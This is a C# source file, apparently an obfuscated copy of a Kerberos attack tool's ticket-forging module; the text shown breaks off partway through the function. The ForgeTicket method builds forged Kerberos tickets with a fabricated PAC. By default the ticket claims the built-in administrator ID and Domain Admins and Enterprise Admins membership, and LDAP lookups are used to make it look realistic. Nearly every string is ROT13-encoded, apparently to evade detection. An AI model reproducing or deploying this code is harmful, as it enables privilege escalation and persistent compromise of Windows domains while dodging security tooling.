//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Security.Principal;
using System.Collections.Generic;
using System.Globalization;
using System.DirectoryServices;
using System.Text.RegularExpressions;
using RObfuscate.lib.Interop;
using RObfuscate.Kerberos.PAC;
using RObfuscate.Kerberos;

namespace RObfuscate
{
    public class ForgeTickets
    {
        public static void ForgeTicket(
            string user,
            string sname,
            byte[] serviceKey,
            Interop.KERB_ETYPE etype,
            byte[] krbKey = null,
            Interop.KERB_CHECKSUM_ALGORITHM krbeType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256,
            bool ldap = false,
            string ldapuser = null,
            string ldappassword = null,
            string sid = "",
            string domain = "",
            string netbiosName = "",
            string domainController = "",
            Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent,
            DateTime? startTime = null,
            DateTime? rangeEnd = null,
            string rangeInterval = "1d",
            DateTime? authTime = null,
            string endTime = "",
            string renewTill = "",
            int? id = null,
            string groups = "",
            string sids = "",
            string displayName = "",
            short? logonCount = null,
            short? badPwdCount = null,
            DateTime? lastLogon = null,
            DateTime? logoffTime = null,
            DateTime? pwdLastSet = null,
            int? maxPassAge = null,
            int? minPassAge = null,
            int? pGid = null,
            string homeDir = "",
            string homeDrive = "",
            string profilePath = "",
            string scriptPath = "",
            string resourceGroupSid = "",
            List<int> resourceGroups = null,
            Interop.PacUserAccountControl uac = Interop.PacUserAccountControl.NORMAL_ACCOUNT,
            bool newPac = true,
            bool extendedUpnDns = false,
            string outfile = null,
            bool ptt = false,
            bool printcmd = false,
            string cName = null,
            string cRealm = null,
            string s4uProxyTarget = null,
            string s4uTransitedServices = null,
            bool includeAuthData = false,
            bool noFullPacSig = false,
            Int32 rodcNumber = 0
            )
        {
            int c = 0;
            DateTime originalStartTime = (DateTime)startTime;
            System.Net.NetworkCredential ldapCred = null;
            int? origMinPassAge = minPassAge;
            int? origMaxPassAge = maxPassAge;

            var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
            kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(user);
            kvi.FullName = new Ndr._RPC_UNICODE_STRING("");
            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING("");
            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING("");
            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING("");
            kvi.LogonScript = new Ndr._RPC_UNICODE_STRING("");
            kvi.LogonServer = new Ndr._RPC_UNICODE_STRING("");
            kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();
            kvi.LogonTime = new Ndr._FILETIME(((DateTime)startTime).AddSeconds(-1));
            kvi.LogoffTime = Ndr._FILETIME.CreateDefault();
            kvi.PasswordLastSet = Ndr._FILETIME.CreateDefault();
            kvi.KickOffTime = Ndr._FILETIME.CreateDefault();
            kvi.PasswordCanChange = Ndr._FILETIME.CreateDefault();
            kvi.PasswordMustChange = Ndr._FILETIME.CreateDefault();
            kvi.LogonCount = 0;
            kvi.BadPasswordCount = 0;
            kvi.UserId = 500;
            kvi.PrimaryGroupId = 513;
            if (string.IsNullOrEmpty(groups))
            {
                kvi.GroupCount = 5;
                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[] {
                    new Ndr._GROUP_MEMBERSHIP(520, 0),
                    new Ndr._GROUP_MEMBERSHIP(512, 0),
                    new Ndr._GROUP_MEMBERSHIP(513, 0),
                    new Ndr._GROUP_MEMBERSHIP(519, 0),
                    new Ndr._GROUP_MEMBERSHIP(518, 0),
                };
            }
            kvi.UserAccountControl = (int)uac;
            kvi.UserFlags = 0;
            if (String.IsNullOrEmpty(sids))
            {
                kvi.SidCount = 0;
                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
                        new Ndr._KERB_SID_AND_ATTRIBUTES()};
            }
            int upnFlags = 1;

            if (!String.IsNullOrEmpty(ldapuser))
            {
                if (!Regex.IsMatch(ldapuser, ".+\\.+", RegexOptions.IgnoreCase))
                {
                    Console.WriteLine(new string("\\e\a[K] /perqhfre fcrpvsvpngvba zhfg or va sdqa sbezng (qbznva.pbz\\hfre)\\e\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    return;
                }

                try
                {
                    string[] ldapParts = ldapuser.Split('\\');
                    string ldapDomainName = ldapParts[0];
                    string ldapUserName = ldapParts[1];

                    ldapCred = new System.Net.NetworkCredential(ldapUserName, ldappassword, ldapDomainName);
                }
                catch
                {
                    Console.WriteLine(new string("\\e\a[K] /perqhfre fcrpvsvpngvba zhfg or va sdqa sbezng (qbznva.pbz\\hfre)\\e\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    return;
                }
            }


            string[] parts = sname.Split('/');
            if (String.IsNullOrEmpty(domain))
            {
                if ((parts.Length > 1) && (parts[0] == new string("xeogtg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                {
                    Console.WriteLine(new string("[K] GTG be ersreeny GTG erdhverf /qbznva gb or cnffrq.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    return;
                }
                else if ((parts.Length == 1) && (sname.Split('@').Length == 1))
                {
                    Console.WriteLine(new string("[K] FCA unf gb or va gur sbezng 'fip/ubfg.qbznva.pbz' be 'ubfg@qbznva.pbz'.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    return;
                }
                else if (parts.Length > 1)
                {
                    domain = parts[1].Substring(parts[1].IndexOf('.') + 1);
                    string[] domainParts = domain.Split(':');
                    if (domainParts.Length > 1)
                    {
                        domain = domainParts[0];
                    }
                }
                else if (sname.Split('@').Length > 1)
                {
                    domain = sname.Split('@')[1];
                }
                else
                {
                    Console.WriteLine("[X] SPN is in a unsupported format: {0}.", sname);
                    return;
                }
            }
            if (String.IsNullOrEmpty(netbiosName))
            {
                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(domain.Substring(0, domain.IndexOf('.')).ToUpper());
            }

            if (ldap)
            {
                List<IDictionary<string, Object>> ActiveDirectoryObjects = null;
                bool ssl = true;
                if (String.IsNullOrEmpty(domainController))
                {
                    domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
                }

                Console.WriteLine("[*] Trying to query LDAP using LDAPS for user information on domain controller {0}", domainController);
                ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
                if (ActiveDirectoryObjects == null)
                {
                    Console.WriteLine(new string("[!] YQNCF snvyrq, ergelvat jvgu cynvagrkg YQNC.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    ssl = false;
                    ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
                }
                if (ActiveDirectoryObjects == null)
                {
                    Console.WriteLine(new string("[K] Reebe YQNC dhrel snvyrq, hanoyr gb perngr gvpxrg hfvat YQNC.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    return;
                }

                foreach (var userObject in ActiveDirectoryObjects)
                {
                    string objectSid = (string)userObject[new string("bowrpgfvq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())];
                    string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));

                    if (uac == Interop.PacUserAccountControl.NORMAL_ACCOUNT)
                    {
                        kvi.UserAccountControl = 0;
                        Interop.LDAPUserAccountControl userUAC = (Interop.LDAPUserAccountControl)userObject[new string("hfrenppbhagpbageby".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())];
                        if ((userUAC & Interop.LDAPUserAccountControl.ACCOUNTDISABLE) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNTDISABLE;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.HOMEDIR_REQUIRED) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.HOMEDIR_REQUIRED;
                        }

                        if ((userUAC & Interop.LDAPUserAccountControl.PASSWD_NOTREQD) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWD_NOTREQD;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.TEMP_DUPLICATE_ACCOUNT) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TEMP_DUPLICATE_ACCOUNT;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.NORMAL_ACCOUNT) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NORMAL_ACCOUNT;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.MNS_LOGON_ACCOUNT) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.MNS_LOGON_ACCOUNT;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.WORKSTATION_TRUST_ACCOUNT) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.WORKSTATION_TRUST_ACCOUNT;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.SERVER_TRUST_ACCOUNT) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SERVER_TRUST_ACCOUNT;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.DONT_EXPIRE_PASSWORD) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.LOCKOUT) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNT_AUTO_LOCKED;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.ENCRYPTED_TEXT_PWD_ALLOWED) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.SMARTCARD_REQUIRED) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SMARTCARD_REQUIRED;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_FOR_DELEGATION) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_FOR_DELEGATION;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.NOT_DELEGATED) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NOT_DELEGATED;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.USE_DES_KEY_ONLY) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_DES_KEY_ONLY;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.DONT_REQ_PREAUTH) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_REQ_PREAUTH;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.PASSWORD_EXPIRED) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWORD_EXPIRED;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.NO_AUTH_DATA_REQUIRED) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NO_AUTH_DATA_REQUIRED;
                        }
                        if ((userUAC & Interop.LDAPUserAccountControl.PARTIAL_SECRETS_ACCOUNT) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PARTIAL_SECRETS_ACCOUNT;
                        }
                        /* No USE_AES_KEYS bit seems to exist in the UAC field returned by LDAP
                        if ((userUAC & Interop.LDAPUserAccountControl.USE_AES_KEYS) != 0)
                        {
                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_AES_KEYS;
                        }*/
                    }

                    if (userObject.ContainsKey(new string("hfrecevapvcnyanzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !String.IsNullOrWhiteSpace((string)userObject[new string("hfrecevapvcnyanzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]))
                    {
                        upnFlags = 0;
                    }

                    List<IDictionary<string, Object>> adObjects = null;

                    string filter = "";
                    string outputText = "";
                    if (string.IsNullOrEmpty(groups))
                    {
                        if (userObject.ContainsKey(new string("zrzorebs".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                        {
                            foreach (string groupDN in (string[])userObject[new string("zrzorebs".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())])
                            {
                                filter += String.Format("(distinguishedname={0})", groupDN);
                            }
                            outputText += new string("tebhc".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                        }
                    }

                    if (pGid == null)
                        filter += String.Format("(objectsid={0}-{1})", domainSid, (string)userObject["primarygroupid"]);

                    if (minPassAge == null || (maxPassAge == null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0)))
                    {
                        filter = String.Format("{0}(name={{31B2F340-016D-11D2-945F-00C04FB984F9}})", filter);
                        if (String.IsNullOrEmpty(outputText))
                        {
                            outputText = new string("qbznva cbyvpl".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                        }
                        else
                        {
                            outputText = String.Format("{0} and domain policy", outputText);
                        }
                    }

                    if (!String.IsNullOrEmpty(filter))
                    {
                        Console.WriteLine("[*] Retrieving {0} information over LDAP from domain controller {1}", outputText, domainController);
                        adObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(|{0})", filter), ssl);
                        if (adObjects == null)
                        {
                            Console.WriteLine("[!] Unable to get {0} information using LDAP, using defaults.", outputText);
                        }
                        else
                        {
                            if (userObject.ContainsKey(new string("zrzorebs".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                            {
                                kvi.GroupCount = ((string[])userObject[new string("zrzorebs".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]).Length + 1;
                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[((string[])userObject[new string("zrzorebs".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]).Length + 1];
                            }
                            else
                            {
                                kvi.GroupCount = 1;
                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[1];
                            }
                            c = 0;
                            foreach (var o in adObjects)
                            {
                                if (o.ContainsKey(new string("tcpsvyrflfcngu".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                                {
                                    string gptTmplPath = String.Format("{0}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf", (string)o["gpcfilesyspath"]);
                                    gptTmplPath = gptTmplPath.Replace(String.Format("\\\\{0}\\", domain), String.Format("\\\\{0}\\", domainController));
                                    Dictionary<string, Dictionary<string, Object>> gptTmplObject = Networking.GetGptTmplContent(gptTmplPath, ldapuser, ldappassword);

                                    if (gptTmplObject == null)
                                    {
                                        Console.WriteLine(new string("[!] Jneavat: Hanoyr gb trg qbznva cbyvpl vasbezngvba, fxvccvat CnffjbeqPnaPunatr naq CnffjbeqZhfgPunatr CNP svryqf.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                        continue;
                                    }

                                    if (minPassAge == null)
                                    {
                                        minPassAge = Int32.Parse((string)gptTmplObject[new string("FlfgrzNpprff".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())][new string("ZvavzhzCnffjbeqNtr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                                        if (minPassAge > 0)
                                        {
                                            kvi.PasswordCanChange = new Ndr._FILETIME(((DateTime)userObject[new string("cjqynfgfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]).AddDays((double)minPassAge));
                                        }
                                    }
                                    if (maxPassAge == null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0))
                                    {
                                        maxPassAge = Int32.Parse((string)gptTmplObject[new string("FlfgrzNpprff".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())][new string("ZnkvzhzCnffjbeqNtr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                                        if (maxPassAge > 0)
                                        {
                                            DateTime pwdLastReset = (DateTime)userObject[new string("cjqynfgfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())];
                                            if (pwdLastReset == DateTime.MinValue)
                                            {
                                                DateTime dt = DateTime.Now;
                                                pwdLastReset = dt.AddDays(-2);
                                            }
                                            kvi.PasswordMustChange = new Ndr._FILETIME((pwdLastReset.AddDays((double)maxPassAge)));
                                        }
                                    }
                                }
                                else
                                {
                                    string groupSid = (string)o[new string("bowrpgfvq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())];
                                    int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.GroupIds, c, 1);
                                    c += 1;
                                }
                            }
                        }
                    }

                    if (String.IsNullOrEmpty(netbiosName))
                    {
                        Console.WriteLine("[*] Retrieving netbios name information over LDAP from domain controller {0}", domainController);

                        string forestRoot = null;
                        try
                        {
                            forestRoot = System.DirectoryServices.ActiveDirectory.Forest.GetCurrentForest().RootDomain.Name;
                        }
                        catch
                        {
                            Console.WriteLine("[!] Unable to query forest root using System.DirectoryServices.ActiveDirectory.Forest, assuming {0} is the forest root", domain);
                            forestRoot = domain;
                        }

                        string configRootDomain = domain;
                        if (!domain.Equals(forestRoot))
                            configRootDomain = forestRoot;

                        string configOU = String.Format("CN=Configuration,DC={0}", configRootDomain.Replace(".", ",DC="));

                        adObjects = Networking.GetLdapQuery(ldapCred, configOU, domainController, domain, String.Format("(&(netbiosname=*)(dnsroot={0}))", domain), ssl);
                        if (adObjects == null)
                        {
                            Console.WriteLine(new string("[!] Hanoyr gb trg argovbf anzr vasbezngvba hfvat YQNC, hfvat qrsnhygf.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                        }
                        else
                        {
                            foreach (var o in adObjects)
                            {
                                if (o.ContainsKey(new string("argovbfanzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                                {
                                    kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING((string)o[new string("argovbfanzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                                }
                            }
                        }
                    }

                    if (userObject.ContainsKey(new string("qvfcynlanzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        kvi.FullName = new Ndr._RPC_UNICODE_STRING((string)userObject[new string("qvfcynlanzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                    }

                    if (String.IsNullOrEmpty(sid))
                    {
                        kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
                    }
                    if (userObject.ContainsKey(new string("ybtbapbhag".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        try
                        {
                            kvi.LogonCount = short.Parse((string)userObject[new string("ybtbapbhag".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                        }
                        catch
                        {
                            kvi.LogonCount = 0;
                        }
                    }
                    if (userObject.ContainsKey(new string("onqcjqpbhag".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        try
                        {
                            kvi.BadPasswordCount = short.Parse((string)userObject[new string("onqcjqpbhag".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                        }
                        catch
                        {
                            kvi.BadPasswordCount = 0;
                        }
                        
                    }
                    if (userObject.ContainsKey(new string("ynfgybtba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && ((DateTime)userObject[new string("ynfgybtba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())] != DateTime.MinValue))
                    {
                        kvi.LogonTime = new Ndr._FILETIME((DateTime)userObject[new string("ynfgybtba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                    }

                    if (userObject.ContainsKey(new string("ynfgybtbss".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && ((DateTime)userObject[new string("ynfgybtbss".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())] != DateTime.MinValue))
                    {
                        kvi.LogoffTime = new Ndr._FILETIME((DateTime)userObject[new string("ynfgybtbss".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                    }
